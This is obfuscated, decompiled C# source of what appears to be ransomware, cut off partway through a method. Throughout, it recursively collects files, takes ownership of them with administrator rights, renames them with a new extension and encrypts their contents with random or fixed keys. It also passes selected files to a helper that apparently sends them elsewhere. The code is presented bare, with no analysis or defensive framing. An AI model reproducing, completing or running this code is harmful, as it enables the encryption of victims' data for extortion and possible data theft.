using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using mZSkaiSmIMoZ;

namespace bmDbQpaZORfnY;

internal sealed class qMBmfvOoVnw
{
	public sealed class LCpFquDeRc
	{
		private static StringCollection eevaGQMWYjLEHWz;

		private static List<string> OvUKsPZlClkm;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107405677));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107405672)) && !text.ToLower().Contains(getString_0(107405619)) && !text.ToLower().Contains(getString_0(107390729)) && !text.ToLower().Contains(getString_0(107390684)) && !text.ToLower().Contains(getString_0(107405638)) && !text.ToLower().Contains(getString_0(107391080)) && !text.ToLower().Contains(getString_0(107391021)) && !text.ToLower().Contains(getString_0(107390972)) && !text.ToLower().Contains(getString_0(107390987)) && !text.ToLower().Contains(getString_0(107390938)) && !text.ToLower().Contains(getString_0(107390904)) && !text.ToLower().Contains(getString_0(107390919)) && !text.ToLower().Contains(getString_0(107390870)) && !text.ToLower().Contains(getString_0(107390889)) && !text.ToLower().Contains(getString_0(107390836)) && !text.ToLower().Contains(getString_0(107390855)) && !text.ToLower().Contains(getString_0(107390298)) && !text.ToLower().Contains(getString_0(107390313)) && !text.ToLower().Contains(getString_0(107390264)) && !text.Contains(EGPIgSWIAKjM(getString_0(107390279))) && !text.Contains(getString_0(107390254)) && !text.Contains(getString_0(107390241)) && !text.EndsWith(getString_0(107396028)) && !text.EndsWith(getString_0(107390216)) && !text.EndsWith(getString_0(107390211)) && !text.EndsWith(getString_0(107390174)) && !text.EndsWith(getString_0(107390169)) && !text.ToLower().Contains(getString_0(107390164)) && !text.ToLower().Contains(jvLiLiQoTuDZZR))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(IDJKHdVBMvjds) * 1024.0 * 1024.0 && PAdnDlyZDpGVLVKD == getString_0(107396933))
							{
								OvUKsPZlClkm.Add(text);
							}
							else if (File.Exists(text) && PAdnDlyZDpGVLVKD == getString_0(107397190))
							{
								OvUKsPZlClkm.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return OvUKsPZlClkm;
		}

		static LCpFquDeRc()
		{
			Strings.CreateGetStringDelegate(typeof(LCpFquDeRc));
			eevaGQMWYjLEHWz = new StringCollection();
			OvUKsPZlClkm = new List<string>();
		}
	}

	private sealed class EdZaEJechbVY
	{
		public string edxNCRypBgXcqS;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == edxNCRypBgXcqS;
		}
	}

	private sealed class zoWrECbrrsVyZ
	{
		private sealed class yHnLnxWYeZg
		{
			public zoWrECbrrsVyZ YOIWxISsNv;

			public string sCDbMwWBxYm;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					esBIxzxbbEqKM(WindowsIdentity.GetCurrent().Name, sCDbMwWBxYm);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				RAEwltXoetBa(sCDbMwWBxYm, YOIWxISsNv.XNUYWUgkag, YOIWxISsNv.ecQGXsQFwB, YOIWxISsNv.FwHbPZhpGwFNinHy, YOIWxISsNv.mPoMybVvWslofL);
			}
		}

		public string[] XNUYWUgkag;

		public string[] FwHbPZhpGwFNinHy;

		public string mPoMybVvWslofL;

		public string ecQGXsQFwB;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			yHnLnxWYeZg CS_0024_003C_003E8__locals0 = new yHnLnxWYeZg();
			CS_0024_003C_003E8__locals0.YOIWxISsNv = this;
			CS_0024_003C_003E8__locals0.sCDbMwWBxYm = string_0;
			if (RNbLVUbXIeVe && !HOGYmrndAaRDe().Contains(getString_0(107388900)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						esBIxzxbbEqKM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sCDbMwWBxYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (YuSNGaINVaPF == getString_0(107396939))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					RAEwltXoetBa(CS_0024_003C_003E8__locals0.sCDbMwWBxYm, CS_0024_003C_003E8__locals0.YOIWxISsNv.XNUYWUgkag, CS_0024_003C_003E8__locals0.YOIWxISsNv.ecQGXsQFwB, CS_0024_003C_003E8__locals0.YOIWxISsNv.FwHbPZhpGwFNinHy, CS_0024_003C_003E8__locals0.YOIWxISsNv.mPoMybVvWslofL);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				RAEwltXoetBa(CS_0024_003C_003E8__locals0.sCDbMwWBxYm, XNUYWUgkag, ecQGXsQFwB, FwHbPZhpGwFNinHy, mPoMybVvWslofL);
			}
		}

		static zoWrECbrrsVyZ()
		{
			Strings.CreateGetStringDelegate(typeof(zoWrECbrrsVyZ));
		}
	}

	private sealed class QNsCvQIrCsizt
	{
		private sealed class eqlNXtZpMbqrj
		{
			public QNsCvQIrCsizt qqCjCfsGjuRl;

			public string JEWgqUOjjJbOLH;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2c()
			{
				foreach (string item in WKHvNffqtncUxo)
				{
					if (JEWgqUOjjJbOLH.ToLower().EndsWith(item + qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == getString_0(107396950))
					{
						if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(JEWgqUOjjJbOLH).Length)
						{
							try
							{
								XWEZyRndCFE.iNNSScDiDt(getString_0(107391195), getString_0(107391190), getString_0(107391145), JEWgqUOjjJbOLH);
							}
							catch
							{
							}
						}
					}
					else if (JEWgqUOjjJbOLH.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107397207))
					{
						try
						{
							XWEZyRndCFE.iNNSScDiDt(getString_0(107391195), getString_0(107391190), getString_0(107391145), JEWgqUOjjJbOLH);
						}
						catch
						{
						}
					}
				}
			}

			static eqlNXtZpMbqrj()
			{
				Strings.CreateGetStringDelegate(typeof(eqlNXtZpMbqrj));
			}
		}

		private sealed class iSFmNVBbBBeAPzre
		{
			public QNsCvQIrCsizt qqCjCfsGjuRl;

			public string HFkAavNBdZG;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in WKHvNffqtncUxo)
				{
					if (HFkAavNBdZG.ToLower().EndsWith(item + qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == getString_0(107396953))
					{
						if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(HFkAavNBdZG).Length)
						{
							try
							{
								XWEZyRndCFE.iNNSScDiDt(getString_0(107391198), getString_0(107391193), getString_0(107391148), HFkAavNBdZG);
							}
							catch
							{
							}
						}
					}
					else if (HFkAavNBdZG.ToLower().EndsWith(item) && PoekpaMfsIzdNH == getString_0(107397210))
					{
						try
						{
							XWEZyRndCFE.iNNSScDiDt(getString_0(107391198), getString_0(107391193), getString_0(107391148), HFkAavNBdZG);
						}
						catch
						{
						}
					}
				}
			}

			static iSFmNVBbBBeAPzre()
			{
				Strings.CreateGetStringDelegate(typeof(iSFmNVBbBBeAPzre));
			}
		}

		public List<string> HuYUDDzzhQG;

		public List<string> yLHvSWZyIOfSs;

		public string jMMRdoeBzVf;

		public string[] LuTPQCjXbTuWq;

		public string slZaBQOSteyNrUAU;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2b(string string_0)
		{
			eqlNXtZpMbqrj CS_0024_003C_003E8__locals0;
			foreach (string item in yLHvSWZyIOfSs)
			{
				if (LuTPQCjXbTuWq.Length != 0)
				{
					string[] luTPQCjXbTuWq = LuTPQCjXbTuWq;
					int num = 0;
					while (num < luTPQCjXbTuWq.Length)
					{
						string value = luTPQCjXbTuWq[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09e1;
					}
				}
				try
				{
					if (item.EndsWith(jMMRdoeBzVf))
					{
						goto IL_09e1;
					}
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				if (!item.EndsWith(string_0) || HHTmAplzYnkC.Contains(item))
				{
					continue;
				}
				if (yhFbdsJLRKYdl == getString_0(107396947))
				{
					try
					{
						if (zGlAchxvJLmK.dWjNsbdIDYugAHM(item))
						{
							zGlAchxvJLmK.cAezDgsOeZnyK(item);
						}
					}
					catch
					{
					}
				}
				HHTmAplzYnkC.Add(item);
				if (!fFYazcYEiRSnDfdk.Contains(Path.GetDirectoryName(item)))
				{
					fFYazcYEiRSnDfdk.Add(Path.GetDirectoryName(item));
				}
				ZmXvznsbkj(item);
				try
				{
					new fMzozyDPnFPucI().dxDBhZVDUbiD(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AvItfCfoelurZ)
							{
								Console.WriteLine(getString_0(107405603) + item + getString_0(107405590) + new FileInfo(item).Length + getString_0(107405537));
								Console.WriteLine(getString_0(107405560));
							}
						}
						catch
						{
						}
						OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107405455)), getString_0(107390126) + item + getString_0(107390126) + EGPIgSWIAKjM(getString_0(107405942)) + getString_0(107390126) + Environment.UserName + getString_0(107390126) + EGPIgSWIAKjM(getString_0(107405893)));
					}
				}
				catch (Exception ex2)
				{
					if (XZxMDRItGAyFV)
					{
						try
						{
							File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + item + getString_0(107405868) + ex2.Message + getString_0(107396383));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (XZxMDRItGAyFV)
						{
							try
							{
								File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + item + getString_0(107405819) + ex4.Message + getString_0(107396383));
							}
							catch (Exception)
							{
							}
						}
						cRWjcXvHmjJ++;
						goto end_IL_02cd;
					}
					if (xUUeBPLKKIuVcVa == getString_0(107396947) && new FileInfo(item).Length > Convert.ToInt32(DtPlrxKatW) * 1024 * 1024 && !HuYUDDzzhQG.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new eqlNXtZpMbqrj();
						CS_0024_003C_003E8__locals0.qqCjCfsGjuRl = this;
						try
						{
							if (jMMRdoeBzVf != getString_0(107388822))
							{
								if (JpnkvfNRcNgFvyr)
								{
									jMMRdoeBzVf = YGiQSxTfeRxLt + jMMRdoeBzVf;
								}
								File.Move(item, item + jMMRdoeBzVf);
							}
						}
						catch (Exception ex6)
						{
							if (XZxMDRItGAyFV)
							{
								try
								{
									File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + item + getString_0(107405726) + ex6.Message + getString_0(107396383));
								}
								catch (Exception)
								{
								}
							}
							cRWjcXvHmjJ++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = getString_0(107391591);
						if (jMMRdoeBzVf != getString_0(107388822))
						{
							CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = item + jMMRdoeBzVf;
						}
						else
						{
							CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = item;
						}
						if (GymFZfNQBIzJM == getString_0(107396947))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in WKHvNffqtncUxo)
								{
									if (CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == eqlNXtZpMbqrj.getString_0(107396950))
									{
										if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH).Length)
										{
											try
											{
												XWEZyRndCFE.iNNSScDiDt(eqlNXtZpMbqrj.getString_0(107391195), eqlNXtZpMbqrj.getString_0(107391190), eqlNXtZpMbqrj.getString_0(107391145), CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH.ToLower().EndsWith(item2) && PoekpaMfsIzdNH == eqlNXtZpMbqrj.getString_0(107397207))
									{
										try
										{
											XWEZyRndCFE.iNNSScDiDt(eqlNXtZpMbqrj.getString_0(107391195), eqlNXtZpMbqrj.getString_0(107391190), eqlNXtZpMbqrj.getString_0(107391145), CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
						string s = uibsyoaCixjw.DOQQVROAHbcwo(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZEIkjDrMet == getString_0(107397204))
						{
							byte[] array = null;
							byte[] byte_ = KpGxARzmOhh.VRtoBnWLnEyOffOBW(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, Convert.ToInt32(DtPlrxKatW) * 1024 * 1024);
							if (KpGxARzmOhh.mQuEGeDjhvV(XCiesfIreL: (!AUEsBSTinpTuD) ? (HtEoifwVYHx ? KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HtEoifwVYHx ? kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), uiFpUcfJDScOD: CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, mAsQTvANrOMVS: bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + jMMRdoeBzVf, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!HtEoifwVYHx)
						{
							if (qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, DtPlrxKatW, slZaBQOSteyNrUAU))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + jMMRdoeBzVf, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH, DtPlrxKatW, text, bytes))
							{
								goto IL_09e1;
							}
							try
							{
								File.Move(item + jMMRdoeBzVf, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (JpnkvfNRcNgFvyr)
					{
						jMMRdoeBzVf = YGiQSxTfeRxLt + jMMRdoeBzVf;
					}
					string text2 = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
					string s2 = uibsyoaCixjw.DOQQVROAHbcwo(text2);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (jMMRdoeBzVf != getString_0(107388822))
					{
						if (!VdDqLkflmc)
						{
							if (!HtEoifwVYHx)
							{
								ogLAgAYNFI(item, item + jMMRdoeBzVf, bmXnqjSSiXMovR);
							}
							else
							{
								ogLAgAYNFI(item, item + jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!HtEoifwVYHx)
								{
									OoNZqxrDFxbIfCy(item, item + jMMRdoeBzVf, bmXnqjSSiXMovR);
								}
								else
								{
									OoNZqxrDFxbIfCy(item, item + jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex11)
							{
								if (XZxMDRItGAyFV)
								{
									try
									{
										File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + item + getString_0(107388264) + ex11.Message + getString_0(107396383));
									}
									catch (Exception)
									{
									}
								}
								cRWjcXvHmjJ++;
								try
								{
									File.Move(item + jMMRdoeBzVf, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!VdDqLkflmc)
					{
						if (!HtEoifwVYHx)
						{
							ogLAgAYNFI(item, item + getString_0(107388817), bmXnqjSSiXMovR);
						}
						else
						{
							ogLAgAYNFI(item, item + getString_0(107388817), Encoding.ASCII.GetBytes(text2));
						}
					}
					else
					{
						try
						{
							if (!HtEoifwVYHx)
							{
								OoNZqxrDFxbIfCy(item, item, bmXnqjSSiXMovR);
							}
							else
							{
								OoNZqxrDFxbIfCy(item, item, Encoding.ASCII.GetBytes(text2));
							}
						}
						catch (Exception ex14)
						{
							if (XZxMDRItGAyFV)
							{
								try
								{
									File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + item + getString_0(107388264) + ex14.Message + getString_0(107396383));
								}
								catch (Exception)
								{
								}
							}
							cRWjcXvHmjJ++;
							goto end_IL_02cd;
						}
					}
					if (HtEoifwVYHx)
					{
						if (jMMRdoeBzVf != getString_0(107388822))
						{
							sefrHhiPzMkPz(item + jMMRdoeBzVf, bytes2);
						}
						else
						{
							sefrHhiPzMkPz(item, bytes2);
						}
					}
					goto IL_09e1;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09e1;
				}
				continue;
				IL_09e1:
				yLHvSWZyIOfSs.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			iSFmNVBbBBeAPzre CS_0024_003C_003E8__locals0 = new iSFmNVBbBBeAPzre();
			CS_0024_003C_003E8__locals0.qqCjCfsGjuRl = this;
			CS_0024_003C_003E8__locals0.HFkAavNBdZG = string_0;
			if (LuTPQCjXbTuWq.Length != 0)
			{
				string[] luTPQCjXbTuWq = LuTPQCjXbTuWq;
				int num = 0;
				while (num < luTPQCjXbTuWq.Length)
				{
					string value = luTPQCjXbTuWq[num];
					if (!CS_0024_003C_003E8__locals0.HFkAavNBdZG.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0ac1;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.EndsWith(jMMRdoeBzVf))
				{
					goto IL_0ac1;
				}
			}
			catch (Exception)
			{
				goto IL_0ac1;
			}
			if (!HHTmAplzYnkC.Contains(CS_0024_003C_003E8__locals0.HFkAavNBdZG))
			{
				if (yhFbdsJLRKYdl == getString_0(107396947))
				{
					try
					{
						if (zGlAchxvJLmK.dWjNsbdIDYugAHM(CS_0024_003C_003E8__locals0.HFkAavNBdZG))
						{
							zGlAchxvJLmK.cAezDgsOeZnyK(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
						}
					}
					catch
					{
					}
				}
				HHTmAplzYnkC.Add(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				if (!fFYazcYEiRSnDfdk.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HFkAavNBdZG)))
				{
					fFYazcYEiRSnDfdk.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HFkAavNBdZG));
				}
				ZmXvznsbkj(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				try
				{
					new fMzozyDPnFPucI().dxDBhZVDUbiD(CS_0024_003C_003E8__locals0.HFkAavNBdZG);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.HFkAavNBdZG, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (AvItfCfoelurZ)
							{
								Console.WriteLine(getString_0(107405603) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107405590) + new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length + getString_0(107405537));
								Console.WriteLine(getString_0(107405560));
							}
						}
						catch
						{
						}
						OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107405455)), getString_0(107390126) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107390126) + EGPIgSWIAKjM(getString_0(107405942)) + getString_0(107390126) + Environment.UserName + getString_0(107390126) + EGPIgSWIAKjM(getString_0(107405893)));
					}
				}
				catch (Exception ex2)
				{
					if (XZxMDRItGAyFV)
					{
						try
						{
							File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107405868) + ex2.Message + getString_0(107396383));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (XZxMDRItGAyFV)
						{
							try
							{
								File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107405819) + ex4.Message + getString_0(107396383));
							}
							catch (Exception)
							{
							}
						}
						cRWjcXvHmjJ++;
						goto end_IL_031d_2;
					}
					if (xUUeBPLKKIuVcVa == getString_0(107396947) && new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length > Convert.ToInt32(DtPlrxKatW) * 1024 * 1024)
					{
						try
						{
							if (jMMRdoeBzVf != getString_0(107388822))
							{
								if (JpnkvfNRcNgFvyr)
								{
									jMMRdoeBzVf = YGiQSxTfeRxLt + jMMRdoeBzVf;
								}
								File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf);
							}
						}
						catch (Exception ex6)
						{
							if (XZxMDRItGAyFV)
							{
								try
								{
									File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107405726) + ex6.Message + getString_0(107396383));
								}
								catch (Exception)
								{
								}
							}
							cRWjcXvHmjJ++;
							return;
						}
						if (jMMRdoeBzVf != getString_0(107388822))
						{
							CS_0024_003C_003E8__locals0.HFkAavNBdZG += jMMRdoeBzVf;
						}
						if (GymFZfNQBIzJM == getString_0(107396947))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in WKHvNffqtncUxo)
								{
									if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == iSFmNVBbBBeAPzre.getString_0(107396953))
									{
										if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HFkAavNBdZG).Length)
										{
											try
											{
												XWEZyRndCFE.iNNSScDiDt(iSFmNVBbBBeAPzre.getString_0(107391198), iSFmNVBbBBeAPzre.getString_0(107391193), iSFmNVBbBBeAPzre.getString_0(107391148), CS_0024_003C_003E8__locals0.HFkAavNBdZG);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.HFkAavNBdZG.ToLower().EndsWith(item) && PoekpaMfsIzdNH == iSFmNVBbBBeAPzre.getString_0(107397210))
									{
										try
										{
											XWEZyRndCFE.iNNSScDiDt(iSFmNVBbBBeAPzre.getString_0(107391198), iSFmNVBbBBeAPzre.getString_0(107391193), iSFmNVBbBBeAPzre.getString_0(107391148), CS_0024_003C_003E8__locals0.HFkAavNBdZG);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
						string s = uibsyoaCixjw.DOQQVROAHbcwo(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZEIkjDrMet == getString_0(107397204))
						{
							byte[] array = null;
							byte[] byte_ = KpGxARzmOhh.VRtoBnWLnEyOffOBW(CS_0024_003C_003E8__locals0.HFkAavNBdZG, Convert.ToInt32(DtPlrxKatW) * 1024 * 1024);
							if (!KpGxARzmOhh.mQuEGeDjhvV(XCiesfIreL: (!AUEsBSTinpTuD) ? (HtEoifwVYHx ? KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (HtEoifwVYHx ? kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kSntQQDhdKClx.retuMYTezoWGtkP(byte_, Encoding.ASCII.GetBytes(slZaBQOSteyNrUAU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), uiFpUcfJDScOD: CS_0024_003C_003E8__locals0.HFkAavNBdZG, mAsQTvANrOMVS: bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!HtEoifwVYHx)
						{
							if (!qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.HFkAavNBdZG, DtPlrxKatW, slZaBQOSteyNrUAU))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else if (!qxPVoZOaesEzvE.qVdRfKhmKIehGw(CS_0024_003C_003E8__locals0.HFkAavNBdZG, DtPlrxKatW, text, bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (JpnkvfNRcNgFvyr)
						{
							jMMRdoeBzVf = YGiQSxTfeRxLt + jMMRdoeBzVf;
						}
						string text2 = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
						string s2 = uibsyoaCixjw.DOQQVROAHbcwo(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (jMMRdoeBzVf != getString_0(107388822))
						{
							if (!VdDqLkflmc)
							{
								if (!HtEoifwVYHx)
								{
									ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, bmXnqjSSiXMovR);
								}
								else
								{
									ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!HtEoifwVYHx)
									{
										OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, bmXnqjSSiXMovR);
									}
									else
									{
										OoNZqxrDFxbIfCy(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex11)
								{
									if (XZxMDRItGAyFV)
									{
										try
										{
											File.AppendAllText(yOCAHBSkOQrG, getString_0(107388562) + CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107388264) + ex11.Message + getString_0(107396383));
										}
										catch (Exception)
										{
										}
									}
									cRWjcXvHmjJ++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.HFkAavNBdZG + jMMRdoeBzVf, CS_0024_003C_003E8__locals0.HFkAavNBdZG);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!VdDqLkflmc)
						{
							if (!HtEoifwVYHx)
							{
								ogLAgAYNFI(CS_0024_003C_003E8__locals0.HFkAavNBdZG, CS_0024_003C_003E8__locals0.HFkAavNBdZG + getString_0(107388817), bmXnqjSSiXMovR);
							}
							else
							{
